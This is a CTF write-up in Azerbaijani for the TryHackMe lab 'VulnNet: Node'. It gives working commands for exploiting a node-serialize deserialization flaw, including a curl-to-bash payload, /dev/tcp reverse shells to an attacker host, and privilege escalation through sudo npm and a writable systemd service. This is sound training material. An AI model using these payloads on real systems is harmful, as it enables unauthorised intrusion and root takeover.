# TryHackMe — VulnNet: Node Writeup (Azərbaycan dilində)

**Platforma:** TryHackMe  
**Otaq:** VulnNet: Node  
**Çətinlik:** Asan  
**Kateqoriya:** Web Exploitation, Insecure Deserialization, Privilege Escalation  
**Link:** https://tryhackme.com/room/vulnnetnode

---

## Məzmun

1. [Kəşfiyyat — Nmap Skan](#1-kəşfiyyat--nmap-skan)
2. [Web — Cookie Analizi](#2-web--cookie-analizi)
3. [Insecure Deserialization — RCE](#3-insecure-deserialization--rce)
4. [Reverse Shell — www-data](#4-reverse-shell--www-data)
5. [Shell Stabilləşdirmə](#5-shell-stabilləşdirmə)
6. [Privilege Escalation — serv-manage](#6-privilege-escalation--serv-manage)
7. [Privilege Escalation — Root](#7-privilege-escalation--root)
8. [Nəticə](#8-nəticə)

---

## 1. Kəşfiyyat — Nmap Skan

```bash
nmap -sV -sC -v <HEDEF_IP>
```

**Nəticə:**

| Port | Servis | Versiya                        |
|------|--------|--------------------------------|
| 22   | SSH    | OpenSSH 7.6p2                  |
| 8080 | HTTP   | Node.js Express framework      |

Port 8080-də **Node.js Express** framework işləyir.

---

## 2. Web — Cookie Analizi

Brauzer ilə `http://<HEDEF_IP>:8080` açıldıqda **VulnNet** xəbər saytı görünür. Yalnız `/login` səhifəsi var — amma form heç yerə göndərmir, backend yoxdur.

### Gobuster

```bash
gobuster dir -u http://<HEDEF_IP>:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Yalnız `/login`, `/css`, `/img` tapılır — başqa gizli endpoint yoxdur.

### Cookie-ni Analiz Et

**F12 → Application → Cookies → session** dəyərini kopyala:

```
eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==
```

Base64 decode et:

```bash
echo "eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==" | base64 -d
```

**Nəticə:**
```json
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
```

Server bu cookie-ni **deserialize** edir — **Insecure Deserialization** zəifliyi!

### Zəifliyi Təsdiqlə

Cookie-nin `username` dəyərini `\` ilə dəyişdirəndə server **500 xətası** qaytarır:

```
SyntaxError: Unexpected end of JSON input
at Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)
```

Server **`node-serialize`** modulu istifadə edir — bu məlum zəiflikdir!

---

## 3. Insecure Deserialization — RCE

`node-serialize` modulunda **`_$$ND_FUNC$$_`** prefiksi ilə başlayan dəyərlər avtomatik funksiya kimi icra edilir.

### Niyə Birbaşa Bash İşləmir?

```bash
# BU İŞLƏMİR — exec() xüsusi simvolları işlətmir
bash -i >& /dev/tcp/IP/4444 0>&1
```

### Düzgün Üsul — curl + bash

Kali-də **shell.sh** faylı yarat:

```bash
echo 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1' > /tmp/shell.sh
cd /tmp
python3 -m http.server 8000
```

Payload hazırla:

```python
import base64

ip = '<KALI_IP>'
http_port = '8000'

payload = '{"username":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'curl http://' + ip + ':' + http_port + '/shell.sh|bash\');}()"}'

b64 = base64.b64encode(payload.encode()).decode()
print(b64)
```

---

## 4. Reverse Shell — www-data

**Terminal 1 — HTTP server:**
```bash
echo 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1' > /tmp/shell.sh
cd /tmp && python3 -m http.server 8000
```

**Terminal 2 — Dinlə:**
```bash
nc -lvnp 4444
```

**BurpSuite Repeater-də:**
```
GET / HTTP/1.1
Host: <HEDEF_IP>:8080
Cookie: session=<BASE64_PAYLOAD>

```

> Qeyd: Cookie-dən sonra mütləq **boş sətir** olmalıdır!

**Send** et → Terminal 1-də `shell.sh` sorğusu görünür → Terminal 2-də shell gəlir!

```bash
whoami
# www-data
```

---

## 5. Shell Stabilləşdirmə

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

Sonra:
```bash
Ctrl + Z
stty raw -echo; fg
export TERM=xterm
```

---

## 6. Privilege Escalation — serv-manage

```bash
sudo -l
```

**Nəticə:**
```
(serv-manage) NOPASSWD: /usr/bin/npm
```

### NPM ilə serv-manage Shell-i

**GTFOBins** metodu — `package.json` `preinstall` skripti:

```bash
echo '{"scripts":{"preinstall":"/bin/sh"}}' > /tmp/package.json
sudo -u serv-manage /usr/bin/npm -C /tmp --unsafe-perm i
```

**serv-manage** kimi shell açılır!

```bash
whoami
# serv-manage

cat /home/serv-manage/user.txt
```

**User flag əldə edildi!**

---

## 7. Privilege Escalation — Root

```bash
sudo -l
```

**Nəticə:**
```
(root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
(root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
(root) NOPASSWD: /bin/systemctl daemon-reload
```

### Servis Faylını Yoxla

```bash
cat /etc/systemd/system/vulnnet-job.service
```

```ini
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```

Faylın icazəlirini yoxla:

```bash
ls -la /etc/systemd/system/vulnnet-job.service
# -rw-rw-r-- 1 root serv-manage
```

**serv-manage** qrubu — **yazma icazəsi var!**

### Servis Faylını Dəyişdir

Kali-də yeni dinləyici aç:
```bash
nc -lvnp 5555
```

Servis faylını dəyişdir:

```bash
cat > /etc/systemd/system/vulnnet-job.service << EOF
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
Type=forking
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<KALI_IP>/5555 0>&1'

[Install]
WantedBy=multi-user.target
EOF
```

Yenidən yüklə və işlət:

```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl start vulnnet-auto.timer
```

**Root shell gəlir!**

```bash
whoami
# root

cat /root/root.txt
```

**Root flag əldə edildi!**

---

## 8. Nəticə

### İstifadə edilən texnikalar

| Addım                    | Alət / Metod                          |
|--------------------------|---------------------------------------|
| Port skanı               | Nmap                                  |
| Qovluq axtarışı          | Gobuster                              |
| Cookie analizi           | Base64 decode                         |
| Zəiflik tapma            | node-serialize xətası (500)           |
| RCE                      | Insecure Deserialization              |
| Reverse shell            | curl + bash (shell.sh)                |
| Shell stabilləşdirmə     | Python3 pty                           |
| Horizontal PrivEsc       | sudo npm + package.json preinstall    |
| Vertical PrivEsc         | systemctl + servis faylı dəyişmə     |

### Əldə edilən flaglar

| Flag      | Yer                              |
|-----------|----------------------------------|
| User flag | `/home/serv-manage/user.txt`     |
| Root flag | `/root/root.txt`                 |

### Öyrənilənlər

- Cookie-lər həmişə analiz edilməlidir — base64 decode et, məzmuna bax.
- `node-serialize` modulu `_$$ND_FUNC$$_` prefiksi ilə funksiya icra edir — **Insecure Deserialization**.
- Node.js `exec()` içində xüsusi simvollar (`>&`, `|`) problem yaradır — **curl + bash** üsulu daha etibarlıdır.
- `sudo npm` → GTFOBins → `package.json preinstall` ilə istifadəçi dəyişmək mümkündür.
- Yazıla bilən systemd servis faylları **root privilege escalation** üçün istifadə edilə bilər.

---

*Writeup müəllifi: CTF həvəskarı*  
*Tarix: 2026*
